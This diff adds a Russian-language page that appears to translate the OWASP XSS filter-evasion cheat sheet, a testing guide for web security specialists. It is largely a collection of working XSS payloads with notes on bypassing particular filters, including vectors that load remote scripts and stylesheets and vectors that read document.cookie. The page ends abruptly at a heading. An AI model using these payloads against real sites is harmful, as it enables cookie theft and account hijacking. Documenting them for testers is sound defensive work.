@@ -1,0 +1,819 @@
+<h2 id="introduction">Введение</h2>
+
+<p>Статья служит руководством по тестированию XSS для специалистов по безопасности приложений. Эта статья изначально опиралась на знаменитую XSS Cheat Sheet RSnake по адресу <code>http://ha.ckers.org/xss.html</code>. Серия OWASP Cheat Sheet предлагает актуальную и поддерживаемую версию документа. Первая статья OWASP — <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">Предотвращение XSS (OWASP Cheat Sheet)</a> — была вдохновлена работой RSnake; авторы благодарны RSnake за идею.</p>
+
+<h2 id="tests">Тесты</h2>
+
+<p>Эта статья показывает", что фильтрация входных данных — неполная мера против XSS. Приведены приёмы XSS, способные обходить отдельные защитные фильтры.</p>
+
+<h3 id="basic-xss-test-without-filter-evasion">Базовый тест XSS без обхода фильтра</h3>
+
+<p>Атака с обычной инъекцией JavaScript в XSS задаёт базовую линию (кавычки в современных браузерах не обязательны, поэтому опущены):</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js&gt;&lt;/SCRIPT&gt;</code></pre></div>
+<h3 id="xss-locator-polyglot">Локатор XSS (полиглот)</h3>
+
+<p>Тест использует «полиглотную» тестовую XSS-нагрузку, исполняемую в нескольких контекстах: HTML, строках сценария, JavaScript и URL:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-javascript">javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;
+&lt;svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'&gt;</code></pre></div>
+<p>(На основе <a href="https://twitter.com/garethheyes/status/997466212190781445">твита</a> <a href="https://twitter.com/garethheyes">Gareth Heyes</a>).</p>
+
+<h3 id="malformed-a-tags">Искажённые теги A</h3>
+
+<p>Тест опускает атрибут <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href"><code>href</code></a>, чтобы показать XSS через обработчики событий:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">\&lt;a onmouseover="alert(document.cookie)"\&gt;xxs link\&lt;/a\&gt;</code></pre></div>
+<p>Chrome автоматически подставляет недостающие кавычки. При сбоях следует попробовать убрать кавычки — Chrome корректно расставит их в URL или сценариях:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">\&lt;a onmouseover=alert(document.cookie)\&gt;xxs link\&lt;/a\&gt;</code></pre></div>
+<p>(Предложено David Cross, проверено в Chrome.)</p>
+
+<h3 id="malformed-img-tags">Искажённые теги IMG</h3>
+
+<p>Метод XSS опирается на «снисходительный» движок отрисовки и формирует вектор внутри тега IMG (его следует заключать в кавычки). Вероятно, изначально это задумывалось как исправление небрежной вёрстки, но одновременно сильно усложняет корректный разбор HTML-тегов:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"\&gt;</code></pre></div>
+<p>(Изначально найдено Begeek; затем очищено и сокращено для работы во всех браузерах.)</p>
+
+<h3 id="fromcharcode">fromCharCode</h3>
+
+<p>Если система запрещает кавычки, можно вызвать <code>eval()</code> с <code>fromCharCode</code> в JavaScript и собрать нужный вектор XSS:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;a href="javascript:alert(String.fromCharCode(88,83,83))"&gt;Click Me!&lt;/a&gt;</code></pre></div>
+<h3 id="default-src-tag-to-get-past-filters-that-check-src-domain">Тег SRC по умолчанию для обхода фильтров по домену SRC</h3>
+
+<p>Атака обходит большинство фильтров по домену в SRC. Вставка JavaScript в обработчик события применима к любым типам HTML-тегов: Form, Iframe, Input, Embed и т.д. Допускается подстановка подходящего события для типа тега — например <code>onblur</code> или <code>onclick</code>, что даёт много вариаций перечисленных инъекций:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;</code></pre></div>
+<p>(Предложено David Cross, правки Abdullah Hussam.)</p>
+
+<h3 id="default-src-tag-by-leaving-it-empty">Пустой SRC по умолчанию</h3>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;IMG SRC= onmouseover="alert('xxs')"&gt;</code></pre></div>
+<h3 id="default-src-tag-by-leaving-it-out-entirely">Полное отсутствие атрибута SRC</h3>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;IMG onmouseover="alert('xxs')"&gt;</code></pre></div>
+<h3 id="on-error-alert">Алерт по onerror</h3>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"&gt;&lt;/img&gt;</code></pre></div>
+<h3 id="img-onerror-and-javascript-alert-encode">IMG onerror и кодирование вызова alert</h3>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;img src=x onerror="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"&gt;</code></pre></div>
+<h3 id="decimal-html-character-references">Десятичные HTML-символные ссылки</h3>
+
+<p>Примеры XSS с директивой <code>javascript:</code> внутри <code>&lt;IMG</code> в Firefox не срабатывают; здесь используются десятичные HTML-символные ссылки как обходной путь:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml"> &lt;a href="&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;"&gt;Click Me!&lt;/a&gt;</code></pre></div>
+<h3 id="decimal-html-character-references-without-trailing-semicolons">Десятичные HTML-ссылки без завершающей точки с запятой</h3>
+
+<p>Часто помогает обходить XSS-фильтры, ищущие подстроку <code>&amp;\#XX;</code>: многие не учитывают дополнение нулями — допускается до 7 цифр. Полезно и против фильтров, декодирующих по шаблону вроде <code>$tmp\_string =\~ s/.\*\\&amp;\#(\\d+);.\*/$1/;</code>, ошибочно полагающих, что HTML-сущность обязана заканчиваться точкой с запятой (встречалось в реальных системах):</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;a href="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"&gt;Click Me&lt;/a&gt;</code></pre></div>
+<h3 id="hexadecimal-html-character-references-without-trailing-semicolons">Шестнадцатеричные HTML-ссылки без завершающей точки с запятой</h3>
+
+<p>Атака срабатывает и против фильтра под строку <code>$tmp\_string=\~ s/.\*\\&amp;\#(\\d+);.\*/$1/;</code>: он предполагает цифры после <code>#</code>, тогда как для шестнадцатеричных HTML-сущностей это неверно:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;a href="&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29"&gt;Click Me&lt;/a&gt;</code></pre></div>
+<h3 id="embedded-tab">Встроенный табулятор</h3>
+
+<p>Приём разрывает цепочку XSS:</p>
+
+<p><!-- markdownlint-disable MD010-->
+</p>
+<div class="cheatsheet-code-window"><pre><code class="language-xml"> &lt;a href="jav   ascript:alert('XSS');"&gt;Click Me&lt;/a&gt;</code></pre></div>
+<!-- markdownlint-enable MD010-->
+
+
+<h3 id="embedded-encoded-tab">Закодированный табулятор</h3>
+
+<p>Тот же приём разрывает XSS:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml"> &lt;a href="jav&amp;#x09;ascript:alert('XSS');"&gt;Click Me&lt;/a&gt;</code></pre></div>
+<h3 id="embedded-newline-to-break-up-xss">Перевод строки для разрыва XSS</h3>
+
+<p>Иногда утверждают, что для атаки подойдут любые символы с кодами 09–13 (десятичные) — это неверно. Работают только 09 (горизонтальная табуляция), 10 (перевод строки) и 13 (возврат каретки). Справка — <a href="https://man7.org/linux/man-pages/man7/ascii.7.html">таблица ASCII</a>. Ниже четыре примера XSS для этого вектора:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;a href="jav&amp;#x0A;ascript:alert('XSS');"&gt;Click Me&lt;/a&gt;</code></pre></div>
+<h4 id="example-1-break-up-xss-attack-with-embedded-carriage-return">Пример 1: разрыв XSS встроенным возвратом каретки</h4>
+
+<p>(Замечание: строки намеренно длиннее необходимого — нули можно опускать. Часто фильтры считают, что hex и dec должны быть из двух или трёх символов; на деле допускается 1–7 символов.)</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;a href="jav&amp;#x0D;ascript:alert('XSS');"&gt;Click Me&lt;/a&gt;</code></pre></div>
+<h4 id="example-2-break-up-javascript-directive-with-null">Пример 2: разрыв директивы JavaScript нулевым байтом</h4>
+
+<p>Нулевые байты тоже дают вектор XSS, но иначе: их нужно внедрять напрямую (например Burp Proxy), через <code>%00</code> в URL или собственный инструмент; в vim нуль даётся как <code>^V^@</code>, либо можно сгенерировать так (в файл):</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt; out</code></pre></div>
+<p><code>%00</code> особенно удобен и в реальных условиях помогал обходить фильтры на вариациях этого примера.</p>
+<h4 id="example-3-spaces-and-meta-chars-before-the-javascript-in-images-for-xss">Пример 3: пробелы и метасимволы перед javascript: в изображениях</h4>
+
+<p>Полезно, если фильтр не учитывает пробелы внутри слова <code>javascript:</code> (их действительно не видно при отображении), но ошибочно считает, что между кавычкой и ключевым словом <code>javascript:</code> пробел недопустим. На деле между ними может стоять любой символ с кодом 1–32 (десятичный):</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;a href=" &amp;#14;  javascript:alert('XSS');"&gt;Click Me&lt;/a&gt;</code></pre></div>
+<h4 id="example-4-non-alpha-non-digit-xss">Пример 4: XSS с небуквенно-нецифровым разделителем</h4>
+
+<p>Парсер HTML в Firefox считает символ не-буква/не-цифра после ключевого слова HTML недопустимым и трактует его как пробельный или невалидный токен после тега. Некоторые XSS-фильтры полагают, что искомый тег обязан разделяться пробелом. Например <code>\&lt;SCRIPT\\s</code> не совпадает с <code>\&lt;SCRIPT/XSS\\s</code>:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;SCRIPT/XSS SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></pre></div>
+<p>Та же идея, расширенная с помощью фаззера Rsnake: движок Gecko допускает между именем обработчика и знаком «равно» любой символ, кроме букв, цифр и «обрамляющих» (кавычки, угловые скобки и т.п.), что облегчает обход блокировок XSS. То же относится к символу grave accent:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;</code></pre></div>
+<p>Yair Amit отмечал различие Trident (IE) и Gecko (Firefox): допустим один слэш между именем тега и параметром без пробелов — полезно, если система запрещает пробелы:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;SCRIPT/SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></pre></div>
+<h3 id="extraneous-open-brackets">Лишние открывающие угловые скобки</h3>
+
+<p>Вектор XSS может обходить детекторы, которые ищут пары «&lt;» и «&gt;» и сравнивают тег внутри, вместо более эффективного поиска целых совпадений (например <a href="https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm">Бойера — Мура</a>) по «&lt;» и имени тега после деобфускации. Двойной слэш закомментирует лишнюю закрывающую часть и подавит ошибку JavaScript:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;&lt;SCRIPT&gt;alert("XSS");//\&lt;&lt;/SCRIPT&gt;</code></pre></div>
+<p>(Предложено Franz Sedlmaier.)</p>
+
+<h3 id="no-closing-script-tags">Без закрывающих тегов SCRIPT</h3>
+
+<p>В Firefox фрагмент <code>\&gt;&lt;/SCRIPT&gt;</code> для этого вектора не обязателен: браузер сам «дозакрывает» HTML-тег. В отличие от следующего приёма, здесь не нужен дополнительный HTML ниже. Кавычки при необходимости можно добавить, обычно они не нужны:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;</code></pre></div>
+<h3 id="protocol-resolution-in-script-tags">Разрешение протокола в тегах SCRIPT</h3>
+
+<p>Вариант частично основан на обходе разрешения протокола Ozh (см. ниже); работает в IE и Edge в режиме совместимости. Удобен при ограничении длины; чем короче домен, тем лучше. Суффикс <code>.j</code> допустим независимо от кодировки — браузер интерпретирует его в контексте SCRIPT:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;SCRIPT SRC=//xss.rocks/.j&gt;</code></pre></div>
+<p>(Предложено Łukasz Pilorz.)</p>
+
+<h3 id="half-open-htmljavascript-xss-vector">Полуоткрытый HTML/JavaScript-вектор XSS</h3>
+
+<p>В отличие от Firefox, движок IE (Trident) не дописывает лишние данные на страницу, но допускает директиву <code>javascript:</code> в изображениях — удобный вектор без закрывающей «&gt;». Ниже точки внедрения должен идти какой-либо HTML-тег: даже без явного <code>\&gt;</code> последующие теги «закроют» конструкцию. Разметка при этом может исказиться. Обходится NIDS-регулярное выражение <code>/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\&lt;)\[^\\n\]+((\\%3E)|\&gt;)/</code>, так как конечный <code>\&gt;</code> не требуется. В реальных системах срабатывало и с незакрытым <code>&lt;IFRAME</code> вместо <code>&lt;IMG</code>.</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;IMG SRC="`&lt;javascript:alert&gt;`('XSS')"</code></pre></div>
+<h3 id="escaping-javascript-escapes">Экранирование экранирования JavaScript</h3>
+
+<p>Если приложение выводит данные пользователя внутрь JavaScript (например <code>&lt;SCRIPT&gt;var a="$ENV{QUERY\_STRING}";&lt;/SCRIPT&gt;</code>), а сервер экранирует кавычки, можно обойти это, экранируя символ экранирования. После внедрения получится <code>&lt;SCRIPT&gt;var a="\\\\";alert('XSS');//";&lt;/SCRIPT&gt;</code> — двойная кавычка «раскрывается», и срабатывает XSS. Локатор XSS использует этот приём:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">\";alert('XSS');//</code></pre></div>
+<p>Альтернатива: если к встроенным данным применено корректное экранирование JSON/JavaScript, но не кодирование вывода HTML — закрыть блок script и открыть свой:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</code></pre></div>
+<h3 id="end-title-tag">Закрытие тега TITLE</h3>
+
+<p>Простой вектор XSS: закрыть <code>&lt;TITLE&gt;</code>, после чего выполнится вредоносный XSS:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;</code></pre></div>
+<h4 id="input-image">INPUT type=image</h4>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;</code></pre></div>
+<h4 id="body-image">Фон BODY (image)</h4>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;</code></pre></div>
+<h4 id="img-dynsrc">IMG DYNSRC</h4>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;</code></pre></div>
+<h4 id="img-lowsrc">IMG LOWSRC</h4>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;</code></pre></div>
+<h3 id="list-style-image">Свойство list-style-image</h3>
+
+<p>Нетривиальная атака через картинку в маркированном списке; из-за директивы <code>javascript:</code> работает только в движке IE. Практическая ценность невелика:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;</code></pre></div>
+<h3 id="vbscript-in-an-image">VBScript в изображении</h3>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;</code></pre></div>
+<h3 id="svg-object-tag">Тег SVG / object</h3>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;svg/onload=alert('XSS')&gt;</code></pre></div>
+<h3 id="ecmascript-6">ECMAScript 6</h3>
+
+<div class="cheatsheet-code-window"><pre><code class="language-javascript">Set.constructor`alert\x28document.domain\x29</code></pre></div>
+<h3 id="body-tag">Тег BODY</h3>
+
+<p>Атака не требует вариантов <code>javascript:</code> или <code>&lt;SCRIPT...</code>. Dan Crowley отмечал пробел перед знаком «равно» (<code>onload=</code> и <code>onload =</code> различаются):</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;BODY ONLOAD=alert('XSS')&gt;</code></pre></div>
+<h4 id="attacks-using-event-handlers">Атаки через обработчики событий</h4>
+
+<p>Приём с тегом BODY распространяется на схожие XSS (на момент написания — один из самых полных перечней в сети). Обновления HTML+TIME — благодарность Rene Ledosquet.</p>
+
+<p>В <a href="http://help.dottoro.com/">Dottoro Web Reference</a> есть <a href="http://help.dottoro.com/ljfvvdnm.php">список событий в JavaScript</a>.</p>
+
+<ul>
+<li><code>onAbort()</code> (прерывание загрузки изображения)</li>
+<li><code>onActivate()</code> (объект становится активным элементом)</li>
+<li><code>onAfterPrint()</code> (после печати или предпросмотра)</li>
+<li><code>onAfterUpdate()</code> (объект данных после обновления в источнике)</li>
+<li><code>onBeforeActivate()</code> (до установки объекта активным элементом)</li>
+<li><code>onBeforeCopy()</code> (строка атаки выполняется непосредственно перед копированием выделения в буфер; возможно через <code>execCommand("Copy")</code>)</li>
+<li><code>onBeforeCut()</code> (строка атаки — непосредственно перед вырезанием выделения)</li>
+<li><code>onBeforeDeactivate()</code> (сразу после смены activeElement с текущего объекта)</li>
+<li><code>onBeforeEditFocus()</code> (до перехода объекта внутри редактируемого элемента в UI-активное состояние или выбора контейнера)</li>
+<li><code>onBeforePaste()</code> (нужна вставка от жертвы или принудительно через <code>execCommand("Paste")</code>)</li>
+<li><code>onBeforePrint()</code> (нужна печать от жертвы или вызов <code>print()</code> / <code>execCommand("Print")</code>).</li>
+<li><code>onBeforeUnload()</code> (нужно закрытие браузера жертвой; атакующий не может выгрузить окно, если оно не порождено родителем)</li>
+<li><code>onBeforeUpdate()</code> (объект данных до обновления в источнике)</li>
+<li><code>onBegin()</code> (onbegin — в момент начала временной шкалы элемента)</li>
+<li><code>onBlur()</code> (другое всплывающее окно загружено, фокус с окна снят)</li>
+<li><code>onBounce()</code> (у marquee behavior = alternate, содержимое достигло края окна)</li>
+<li><code>onCellChange()</code> (изменение данных у провайдера данных)</li>
+<li><code>onChange()</code> (поле select, text или TEXTAREA потеряло фокус, значение изменено)</li>
+<li><code>onClick()</code> (щелчок по форме)</li>
+<li><code>onContextMenu()</code> (нужен контекстный щелчок по зоне атаки)</li>
+<li><code>onControlSelect()</code> (перед выбором элемента управления объекта)</li>
+<li><code>onCopy()</code> (копирование жертвой или <code>execCommand("Copy")</code>)</li>
+<li><code>onCut()</code> (вырезание жертвой или <code>execCommand("Cut")</code>)</li>
+<li><code>onDataAvailable()</code> (изменение данных в элементе жертвой или тем же действием атакующего)</li>
+<li><code>onDataSetChanged()</code> (набор данных источника изменился)</li>
+<li><code>onDataSetComplete()</code> (все данные от источника получены)</li>
+<li><code>onDblClick()</code> (двойной щелчок по элементу формы или ссылке)</li>
+<li><code>onDeactivate()</code> (activeElement перешёл с текущего объекта на другой в родительском документе)</li>
+<li><code>onDrag()</code> (требуется перетаскивание объектов жертвой)</li>
+<li><code>onDragEnd()</code> (требуется перетаскивание объектов жертвой)</li>
+<li><code>onDragLeave()</code> (перетаскивание за пределы допустимой области)</li>
+<li><code>onDragEnter()</code> (перетаскивание в допустимую область)</li>
+<li><code>onDragOver()</code> (перетаскивание в допустимую область)</li>
+<li><code>onDragDrop()</code> (сброс объекта, например файла, на окно браузера)</li>
+<li><code>onDragStart()</code> (начало операции перетаскивания)</li>
+<li><code>onDrop()</code> (сброс объекта, например файла, на окно браузера)</li>
+<li><code>onEnd()</code> (onEnd — окончание временной шкалы)</li>
+<li><code>onError()</code> (ошибка загрузки документа или изображения)</li>
+<li><code>onErrorUpdate()</code> (ошибка обновления связанных данных в источнике у привязанного объекта)</li>
+<li><code>onFilterChange()</code> (визуальный фильтр завершил смену состояния)</li>
+<li><code>onFinish()</code> (эксплуатация после завершения циклов marquee)</li>
+<li><code>onFocus()</code> (строка атаки при получении окном фокуса)</li>
+<li><code>onFocusIn()</code> (строка атаки при получении окном фокуса)</li>
+<li><code>onFocusOut()</code> (строка атаки при потере окном фокуса)</li>
+<li><code>onHashChange()</code> (изменилась часть адреса после #)</li>
+<li><code>onHelp()</code> (строка атаки при нажатии F1 в фокусе окна)</li>
+<li><code>onInput()</code> (текст элемента изменён через интерфейс)</li>
+<li><code>onKeyDown()</code> (нажатие клавиши)</li>
+<li><code>onKeyPress()</code> (нажатие или удержание клавиши)</li>
+<li><code>onKeyUp()</code> (отпускание клавиши)</li>
+<li><code>onLayoutComplete()</code> (печать или предпросмотр печати)</li>
+<li><code>onLoad()</code> (строка атаки после загрузки окна)</li>
+<li><code>onLoseCapture()</code> (эксплуатация через <code>releaseCapture()</code>)</li>
+<li><code>onMediaComplete()</code> (потоковый медиафайл — событие может наступить до начала воспроизведения)</li>
+<li><code>onMediaError()</code> (страница с медиафайлом; событие при сбое)</li>
+<li><code>onMessage()</code> (документ получил сообщение)</li>
+<li><code>onMouseDown()</code> (нужен щелчок по изображению жертвой)</li>
+<li><code>onMouseEnter()</code> (курсор над объектом или областью)</li>
+<li><code>onMouseLeave()</code> (наведение на изображение/таблицу и уход курсора)</li>
+<li><code>onMouseMove()</code> (движение курсора над изображением или таблицей)</li>
+<li><code>onMouseOut()</code> (наведение на изображение/таблицу и уход курсора)</li>
+<li><code>onMouseOver()</code> (курсор над объектом или областью)</li>
+<li><code>onMouseUp()</code> (нужен щелчок по изображению жертвой)</li>
+<li><code>onMouseWheel()</code> (нужна прокрутка колёсиком жертвой)</li>
+<li><code>onMove()</code> (перемещение страницы жертвой или атакующим)</li>
+<li><code>onMoveEnd()</code> (перемещение страницы жертвой или атакующим)</li>
+<li><code>onMoveStart()</code> (перемещение страницы жертвой или атакующим)</li>
+<li><code>onOffline()</code> (браузер переходит из онлайн в офлайн)</li>
+<li><code>onOnline()</code> (браузер переходит из офлайн в онлайн)</li>
+<li><code>onOutOfSync()</code> (прерывание воспроизведения по шкале времени)</li>
+<li><code>onPaste()</code> (вставка жертвой или <code>execCommand("Paste")</code>)</li>
+<li><code>onPause()</code> (onpause — для всех активных элементов при паузе шкалы, включая body)</li>
+<li><code>onPopState()</code> (навигация по истории сеанса)</li>
+<li><code>onPropertyChange()</code> (смена свойства элемента)</li>
+<li><code>onReadyStateChange()</code> (смена свойства элемента)</li>
+<li><code>onRedo()</code> (шаг вперёд в истории отмены)</li>
+<li><code>onRepeat()</code> (один раз на каждое повторение шкалы, кроме первого полного цикла)</li>
+<li><code>onReset()</code> (сброс формы)</li>
+<li><code>onResize()</code> (изменение размера окна; автозапуск, например <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
+<li><code>onResizeEnd()</code> (изменение размера окна; автозапуск, например <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
+<li><code>onResizeStart()</code> (изменение размера окна; автозапуск, например <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
+<li><code>onResume()</code> (onresume — для элементов, становящихся активными при возобновлении шкалы, включая body)</li>
+<li><code>onReverse()</code> (при repeatCount &gt; 1 — при каждом начале обратного хода шкалы)</li>
+<li><code>onRowsEnter()</code> (изменение строки в источнике данных)</li>
+<li><code>onRowExit()</code> (изменение строки в источнике данных)</li>
+<li><code>onRowDelete()</code> (удаление строки в источнике данных)</li>
+<li><code>onRowInserted()</code> (вставка строки в источник данных)</li>
+<li><code>onScroll()</code> (прокрутка жертвой или <code>scrollBy()</code>)</li>
+<li><code>onSeek()</code> (событие <code>onReverse</code> при воспроизведении шкалы не только вперёд)</li>
+<li><code>onSelect()</code> (выделение текста; автозапуск, например <code>window.document.execCommand("SelectAll");</code>)</li>
+<li><code>onSelectionChange()</code> (выделение текста; автозапуск, например <code>window.document.execCommand("SelectAll");</code>)</li>
+<li><code>onSelectStart()</code> (выделение текста; автозапуск, например <code>window.document.execCommand("SelectAll");</code>)</li>
+<li><code>onStart()</code> (начало каждого цикла marquee)</li>
+<li><code>onStop()</code> (кнопка «Стоп» или уход со страницы)</li>
+<li><code>onStorage()</code> (изменение области хранения)</li>
+<li><code>onSyncRestored()</code> (прерывание воспроизведения по шкале для срабатывания)</li>
+<li><code>onSubmit()</code> (отправка формы жертвой или атакующим)</li>
+<li><code>onTimeError()</code> (недопустимое значение временного свойства, например dur)</li>
+<li><code>onTrackChange()</code> (смена дорожки в playList)</li>
+<li><code>onUndo()</code> (шаг назад в истории отмены)</li>
+<li><code>onUnload()</code> (переход по ссылке, «Назад» или принудительный щелчок)</li>
+<li><code>onURLFlip()</code> (ASF-файл в теге HTML+TIME обрабатывает встроенные в ASF команды сценария)</li>
+<li><code>seekSegmentTime()</code> (метод: позиция на сегментной шкале времени и воспроизведение от неё; сегмент — одно прохождение шкалы, включая обратный ход с AUTOREVERSE)</li>
+</ul>
+
+<h4 id="bgsound">BGSOUND</h4>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;</code></pre></div>
+<h4 id="javascript-includes">Включения JavaScript (&amp;)</h4>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;BR SIZE="&amp;{alert('XSS')}"&gt;</code></pre></div>
+<h4 id="style-sheet">Таблица стилей STYLE</h4>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;</code></pre></div>
+<h3 id="remote-style-sheet">Удалённая таблица стилей</h3>
+
+<p>Через подключение внешнего CSS можно внедрить XSS: параметры стиля переопределяются встроенным выражением. Только IE. На странице нет явных признаков подключённого JavaScript. Во всех примерах с удалённым CSS используется тег body — на пустой странице не сработает без хотя бы одного символа контента помимо вектора:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;LINK REL="stylesheet" HREF="http://xss.rocks/xss.css"&gt;</code></pre></div>
+<h4 id="remote-style-sheet-part-2">Удалённая таблица стилей, часть 2</h4>
+
+<p>То же, но тег <code>&lt;STYLE&gt;</code> вместо <code>&lt;LINK&gt;</code>. Вариация этого вектора применялась против Google Desktop. Закрывающий <code>&lt;/STYLE&gt;</code> можно опустить, если сразу после вектора идёт HTML, который закроет конструкцию — удобно, если в XSS нельзя использовать «=» или «/» (встречалось в реальных фильтрах):</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;STYLE&gt;@import'http://xss.rocks/xss.css';&lt;/STYLE&gt;</code></pre></div>
+<h4 id="remote-style-sheet-part-3">Удалённая таблица стилей, часть 3</h4>
+
+<p>Только Gecko: привязка XUL-файла к родительской странице.</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;STYLE&gt;BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}&lt;/STYLE&gt;</code></pre></div>
+<h3 id="style-tags-that-breaks-up-javascript-for-xss">Теги STYLE, разрывающие JavaScript для XSS</h3>
+
+<p>Иногда этот XSS вводит IE в бесконечный цикл alert:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;</code></pre></div>
+<h3 id="style-attribute-that-breaks-up-an-expression">Атрибут STYLE с разрывом expression</h3>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt;</code></pre></div>
+<p>(Roman Ivanov.)</p>
+
+<h3 id="img-style-with-expressions">IMG STYLE с expression</h3>
+
+<p>Гибрид двух предыдущих векторов; показывает, насколько сложно разбирать теги STYLE. Может зациклить IE:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">exp/*&lt;A STYLE='no\xss:noxss("*//*");
+xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;</code></pre></div>
+<h3 id="style-tag-using-background-image">Тег STYLE и background-image</h3>
+
